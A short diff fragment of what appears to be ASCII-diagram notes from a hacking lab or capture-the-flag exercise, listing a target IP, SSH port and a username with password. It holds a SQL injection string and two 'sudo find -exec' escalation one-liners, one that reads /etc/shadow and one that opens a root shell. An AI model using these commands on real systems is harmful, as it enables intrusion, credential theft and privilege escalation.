@@ -22,7 +22,7 @@ product=7 UNION SELECT * FROM users
      |
      V
 +---------+ RoundSensor
-|         | 192.168.28.172               root access: sudo find . -exec cat /etc/shadow \; -quit
+|         | 192.168.28.172               root access: sudo find . -exec su root \; -quit
 |         | Aaron = apasswordyPa$$word
 +---------+ 22
     |
